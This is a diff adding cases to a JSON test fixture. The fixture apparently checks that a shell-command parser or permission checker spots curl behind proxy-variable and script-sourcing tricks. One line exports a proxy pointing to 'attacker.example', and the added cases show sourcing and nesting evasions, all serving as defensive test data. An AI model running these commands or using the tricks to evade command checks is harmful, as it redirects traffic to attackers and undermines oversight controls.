@@ -89,6 +89,11 @@
     "p=proxy; P=PROXY; export http_$p=http://attacker.example:8080 no_$p= NO_$P=; curl http://localhost": "curl",
     "declare -x http_$p=http://p.example; curl localhost": "curl",
     "export \"$NAME\"=http://p.example; curl localhost": "curl",
-    "export `echo http_proxy`=http://p.example; curl localhost": "curl"
+    "export `echo http_proxy`=http://p.example; curl localhost": "curl",
+    ". ./route.sh; curl http://localhost": "curl",
+    "source ~/.proxyrc && curl localhost": "curl",
+    "curl localhost; . ./route.sh": "curl",
+    "if true; then . ./route.sh; fi; curl localhost": "curl",
+    "echo $(. ./route.sh; curl localhost)": "curl"
   }
 }
